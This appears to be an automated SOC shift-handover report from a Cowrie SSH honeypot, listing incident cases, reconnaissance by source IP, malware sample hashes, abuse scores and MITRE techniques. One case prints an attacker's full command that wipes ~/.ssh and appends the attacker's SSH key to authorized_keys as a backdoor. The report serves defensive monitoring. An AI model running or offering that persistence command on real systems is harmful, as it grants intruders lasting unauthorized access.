
**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 15:07:02` | `cowrie.session.connect` |
| `2026-06-12 15:07:02` | `cowrie.client.version` |
| `2026-06-12 15:07:03` | `cowrie.client.kex` |
| `2026-06-12 15:07:04` | `cowrie.login.success` |
| `2026-06-12 15:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.160[.]50` to AbuseIPDB if not already reported
- [ ] Block `179.184.160[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c375fa4b4c5

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-06-12 15:09 |
| **Last Seen** | 2026-06-12 15:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 15:09:59` | `cowrie.session.connect` |
| `2026-06-12 15:09:59` | `cowrie.client.version` |
| `2026-06-12 15:09:59` | `cowrie.client.kex` |
| `2026-06-12 15:10:00` | `cowrie.login.success` |
| `2026-06-12 15:10:00` | `cowrie.session.params` |
| `2026-06-12 15:10:00` | `cowrie.command.input` |
| `2026-06-12 15:10:00` | `cowrie.command.failed` |
| `2026-06-12 15:10:01` | `cowrie.log.closed` |
| `2026-06-12 15:10:01` | `cowrie.session.params` |
| `2026-06-12 15:10:01` | `cowrie.command.input` |
| `2026-06-12 15:10:01` | `cowrie.session.file_download` |
| `2026-06-12 15:10:01` | `cowrie.log.closed` |
| `2026-06-12 15:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f0b80d2dc1

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-06-12 15:10 |
| **Last Seen** | 2026-06-12 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 15:10:03` | `cowrie.session.connect` |
| `2026-06-12 15:10:03` | `cowrie.client.version` |
| `2026-06-12 15:10:03` | `cowrie.client.kex` |
| `2026-06-12 15:10:04` | `cowrie.login.success` |
| `2026-06-12 15:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `114.220.176[.]69` | **31** | 2026-06-12 13:35 | 2026-06-12 14:07 | 55m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.25.158[.]80` | **30** | 2026-06-12 12:56 | 2026-06-12 14:03 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `178.255.72[.]35` | **30** | 2026-06-12 12:58 | 2026-06-12 14:00 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.82.120[.]244` | **30** | 2026-06-12 13:01 | 2026-06-12 14:24 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.99.99[.]95` | **30** | 2026-06-12 13:12 | 2026-06-12 14:26 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.196.236[.]141` | **30** | 2026-06-12 10:19 | 2026-06-12 11:20 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `98.26.115[.]52` | **30** | 2026-06-12 12:59 | 2026-06-12 14:47 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `122.35.192[.]61` | **29** | 2026-06-12 13:03 | 2026-06-12 14:18 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.184.160[.]50` | **29** | 2026-06-12 13:09 | 2026-06-12 15:10 | 1m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.127[.]190` | **24** | 2026-06-12 11:39 | 2026-06-12 13:21 | 6m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `128.199.25[.]179` | **11** | 2026-06-12 10:21 | 2026-06-12 15:04 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `175.182.37[.]66` | **11** | 2026-06-12 10:57 | 2026-06-12 11:51 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.180.213[.]153` | **10** | 2026-06-12 10:26 | 2026-06-12 11:58 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `210.79.191[.]76` | **10** | 2026-06-12 13:24 | 2026-06-12 13:38 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `89.117.50[.]180` | **7** | 2026-06-12 13:01 | 2026-06-12 14:22 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `103.151.140[.]79` | **5** | 2026-06-12 12:59 | 2026-06-12 14:16 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `102.220.87[.]78` | **4** | 2026-06-12 10:19 | 2026-06-12 10:25 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.46[.]139` | **3** | 2026-06-12 15:07 | 2026-06-12 15:18 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.1[.]128` | **2** | 2026-06-12 13:50 | 2026-06-12 13:52 | 4m | 0 | `T1592` | 🟢 LOW |
| `188.157.143[.]122` | **2** | 2026-06-12 12:33 | 2026-06-12 12:33 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.39[.]214` | 1 | 2026-06-12 13:37 | 2026-06-12 13:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.11.34[.]221` | 1 | 2026-06-12 14:34 | 2026-06-12 14:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.219.177[.]95` | 1 | 2026-06-12 12:31 | 2026-06-12 12:31 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.45[.]48` | 1 | 2026-06-12 13:47 | 2026-06-12 13:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.248.224[.]227` | 1 | 2026-06-12 12:32 | 2026-06-12 12:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.239.79[.]68` | 1 | 2026-06-12 15:19 | 2026-06-12 15:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.167.89[.]157` | 1 | 2026-06-12 11:32 | 2026-06-12 11:32 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `124.6.165[.]86` | 1 | 2026-06-12 13:18 | 2026-06-12 13:18 | 14s | 0 | `T1592` | 🟢 LOW |
| `128.116.129[.]157` | 1 | 2026-06-12 13:46 | 2026-06-12 13:46 | 12s | 0 | `T1592` | 🟢 LOW |
| `134.33.68[.]250` | 1 | 2026-06-12 15:21 | 2026-06-12 15:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-06-12 15:14 | 2026-06-12 15:14 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.111[.]135` | 1 | 2026-06-12 13:32 | 2026-06-12 13:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.67[.]10` | 1 | 2026-06-12 11:46 | 2026-06-12 11:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.204[.]161` | 1 | 2026-06-12 14:04 | 2026-06-12 14:04 | 33s | 0 | `T1592` | 🟢 LOW |
| `163.7.6[.]74` | 1 | 2026-06-12 15:16 | 2026-06-12 15:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.237.176[.]209` | 1 | 2026-06-12 14:01 | 2026-06-12 14:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-06-12 11:49 | 2026-06-12 11:49 | 10s | 0 | `T1592` | 🟢 LOW |
| `183.171.149[.]196` | 1 | 2026-06-12 13:37 | 2026-06-12 13:37 | 9s | 0 | `T1592` | 🟢 LOW |
| `183.247.171[.]186` | 1 | 2026-06-12 13:18 | 2026-06-12 13:19 | 45s | 0 | `T1592` | 🟢 LOW |
| `183.36.126[.]68` | 1 | 2026-06-12 11:41 | 2026-06-12 11:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.3.150[.]139` | 1 | 2026-06-12 15:00 | 2026-06-12 15:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.199.224[.]52` | 1 | 2026-06-12 15:10 | 2026-06-12 15:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `216.213.158[.]112` | 1 | 2026-06-12 14:27 | 2026-06-12 14:27 | 13s | 0 | `T1592` | 🟢 LOW |
| `223.75.156[.]89` | 1 | 2026-06-12 12:18 | 2026-06-12 12:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.164.133[.]108` | 1 | 2026-06-12 12:53 | 2026-06-12 12:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.123.110[.]70` | 1 | 2026-06-12 15:21 | 2026-06-12 15:21 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.136.50[.]69` | 1 | 2026-06-12 13:03 | 2026-06-12 13:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.52.33[.]177` | 1 | 2026-06-12 14:12 | 2026-06-12 14:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `62.122.195[.]14` | 1 | 2026-06-12 13:21 | 2026-06-12 13:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `134.33.68[.]250` | US | Microsoft Limited | **100** ⚠️ | 0 |
| `103.250.149[.]148` | IN | Gtpl Broadband Pvt. Ltd. | **100** ⚠️ | 50 |
| `89.117.50[.]180` | FR | IPXO | **100** ⚠️ | 1 |
| `111.70.1[.]128` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 47 |
| `14.29.204[.]161` | CN | CHINANET Guangdong province network | **100** ⚠️ | 37 |
| `183.247.171[.]186` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `128.116.129[.]157` | IT | EOLO S.p.A. | **100** ⚠️ | 2 |
| `120.239.79[.]68` | CN | China Mobile Communications Corporation | **100** ⚠️ | 4 |
| `121.239.227[.]101` | CN | CHINANET jiangsu province network | **100** ⚠️ | 1 |
| `115.190.127[.]190` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 553 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 304 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 191 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 95 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 95 |

---

## 🔕 False Positive Summary (46 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 41 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 624 cases |
| Tool 34  | Credential Extractor        | ✅ 496 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 77 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 46 filtered (7.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 53 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 191 priority case(s) shown individually · 49 recon entry/entries in table (20 group(s) consolidating 358 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-12T15:23:27Z_
